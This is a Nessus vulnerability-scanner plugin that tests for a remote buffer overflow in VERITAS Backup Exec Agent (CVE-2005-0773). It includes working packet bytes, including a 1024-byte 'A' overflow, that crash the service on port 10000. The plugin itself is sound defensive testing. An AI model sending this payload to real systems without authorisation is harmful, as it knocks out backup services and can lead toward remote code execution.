#
# (C) Tenable Network Security
#

if(description)
{
 script_id(18551);
 script_version("$Revision: 1.6 $");
 script_cve_id("CVE-2005-0773");
 script_bugtraq_id(14019, 14021, 14022);
 script_xref(name:"IAVA", value:"2005-B-0014");
 script_xref(name:"OSVDB", value:"17624");

 name["english"] = "VERITAS Backup Exec Agent Remote Buffer Overflow Vulnerability (DoS)";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

Arbitrary code can be executed on the remote host.

Description :

The remote host is running a version of VERITAS Backup Exec Agent
which is vulnerable to a remote buffer overflow.  An attacker may
exploit this flaw to execute arbitrary code on the remote host or to
disable this service remotely. 

To exploit this flaw, an attacker would need to send a specially
crafted packet to the remote service. 

Solution :

http://seer.support.veritas.com/docs/276604.htm

Risk factor :

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";


 script_description(english:desc["english"]);
 
 summary["english"] = "Test the VERITAS Backup Exec Agent buffer overflow";

 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");
 family["english"] = "Gain root remotely";
 script_family(english:family["english"]);
 
 script_require_ports(10000);
 exit(0);
}

port = 10000;

connect_open_request = raw_string(
	0x80, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01, 0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03
);


connect_client_auth_request = raw_string (
	0x80, 0x00, 0x04, 0x3E, 0x00, 0x00, 0x00, 0x02, 0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x09, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 
	0x00, 0x00, 0x00, 0x06, 0x6E, 0x65, 0x73, 0x73, 0x75, 0x73, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00) +
	crap(data:"A", length:0x400) + raw_string (0x00, 0x00, 0x00, 0x04, 0x04);

if (!get_port_state(port))
  exit (0);

soc = open_sock_tcp (port);
if (!soc) exit (0);

buf = recv (socket:soc, length:40);
send (socket:soc, data:connect_open_request);
buf = recv (socket:soc, length:32);
send (socket:soc, data:connect_client_auth_request);
close (soc);

sleep (10);

soc = open_sock_tcp (port);
if (!soc)
  security_hole (port);

